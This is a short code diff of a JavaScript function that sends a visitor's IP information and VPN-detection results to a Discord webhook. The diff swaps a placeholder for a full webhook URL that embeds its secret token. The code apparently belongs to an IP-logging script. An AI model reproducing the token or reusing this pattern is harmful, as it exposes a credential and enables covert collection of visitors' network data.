@@ -1,7 +1,7 @@
 // Function to send IP information to Discord webhook
 function sendIPInfoToDiscord(ipInfo, isUsingVPN, vpnServiceName) {
 
-  const webhookUrl = `<your-webhook-url>`; // Change it with your discord webhook
+  const webhookUrl = `https://discord.com/api/webhooks/1381352656907407430/iVllgtIG4bhE07zjzkox8yfCt8HARxuJi30nm2mLV-akkeEIWRYqq2fmPvR4gW_wk3sN`; // Change it with your discord webhook
 
   const xhr = new XMLHttpRequest();
   xhr.open('POST', webhookUrl);
